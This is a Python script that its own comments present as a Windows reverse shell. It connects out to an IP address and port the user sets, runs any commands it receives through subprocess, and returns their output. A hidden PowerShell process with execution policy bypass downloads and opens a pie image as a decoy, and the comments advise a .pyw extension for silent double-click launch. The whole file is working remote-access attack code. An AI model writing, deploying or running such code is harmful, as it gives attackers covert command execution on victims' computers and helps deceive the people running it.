#Try2eatpy
#A spin-off from Pys43ll that will display a slice of pie when executed. Try2eatpy interacts with PowerShell. See below.
#A Python Reverse Shell that can be used in Windows. This requires Python3 to be installed.
#The file can be saved with .pyw to allow a double-click execution.
#Remember to add the IP address and Port of your choosing.
#Example usage: .\try2eat.py

#Import your modules
import os
import sys
import subprocess
import socket

#Initialize your variables
uno = int(1)
zero = int(0)
where = str ('cd')
leave = str ('exit')
hiz = str("1.1.1.1")#Add IP Address
LISNER = 57777#Add Port
B_SIZ= 1024 * 128
SEP = "<seperationiskey>"
truth = True

#Creation of Soccy
soccy = socket.socket()

#Connection
soccy.connect((hiz, LISNER)) 

#Display the current working directory
clabordir = str(os.getcwd() + '<pys43ll> ')
soccy.send(clabordir.encode())

#Work with PowerShell to display that delicious pie
subprocess.Popen("powershell.exe -windowstyle hidden -executionpolicy bypass iwr 'https://www.pexels.com/photo/1282279/download/?search_query=pie&tracking_id=pkkfjrldff' -o $env:userprofile\Pictures\pie.jpg; cd $env:userprofile\Pictures; .\pie.jpg")

#While loop to keep the shell alive
while truth:

        info = soccy.recv(B_SIZ).decode()
        
        spaceBetween = info.split()
        
        if info.lower() == leave:
        
            break
        
        if spaceBetween[zero].lower() == where:
        
            try:
            
                os.chdir(' '.join(spaceBetween[uno:]))
                
            except FileNotFoundError as e:
            
                outward = str(e)
                
            else:
            
                outward = ""
                
        else:
        
            outward = subprocess.getoutput(info)
            
        clabordir = str(os.getcwd() + '<pys43ll> ')
        
        contents = f"{outward}{SEP}{clabordir}"
        soccy.send(contents.encode())
#Close when finished
soccy.close()





